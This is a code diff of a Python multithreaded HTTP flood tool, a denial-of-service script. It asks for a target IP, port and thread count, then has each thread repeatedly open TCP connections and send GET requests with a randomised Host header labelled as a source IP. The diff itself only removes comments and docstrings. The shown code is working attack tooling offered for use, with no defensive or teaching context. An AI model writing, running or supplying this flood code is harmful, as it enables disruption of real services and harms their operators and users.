@@ -19,7 +19,6 @@ stop_attack = threading.Event()
 
 
 def validate_ip(ip):
-    """Validate IP address format."""
     try:
         ip_address(ip)
         return True
@@ -28,31 +27,19 @@ def validate_ip(ip):
 
 
 def generate_source_ip():
-    """Generate a random source IP address."""
     return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
 
 
 def attack(target_ip, target_port, thread_id):
-    """
-    Send HTTP GET requests to target.
-    
-    Args:
-        target_ip: Target IP address
-        target_port: Target port number
-        thread_id: Thread identifier for logging
-    """
     while not stop_attack.is_set():
         try:
             source_ip = generate_source_ip()
             
-            # Create socket with timeout
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(3)  # 3-second timeout
+            s.settimeout(3)  # Create socket with timeout
             
-            # Connect to target
             s.connect((target_ip, target_port))
             
-            # Send HTTP GET request (use send() for TCP, not sendto())
             request = f"GET / HTTP/1.1\r\nHost: {source_ip}\r\n\r\n"
             s.send(request.encode('ascii'))
             
@@ -78,12 +65,9 @@ def attack(target_ip, target_port, thread_id):
 
 
 def main():
-    """Main function to initialize and run the attack."""
     try:
-        # Get user inputs
         target_ip = input("Enter Target IP (e.g. 192.168.0.1): ").strip()
         
-        # Validate IP
         if not validate_ip(target_ip):
             print("Invalid IP address format!")
             return
@@ -99,7 +83,6 @@ def main():
         print(f"\nStarting attack on {target_ip}:{target_port} with {num_threads} threads")
         print("Press Ctrl+C to stop...\n")
         
-        # Create and start threads
         threads = []
         for i in range(num_threads):
             thread = threading.Thread(target=attack, args=(target_ip, target_port, i), daemon=False)
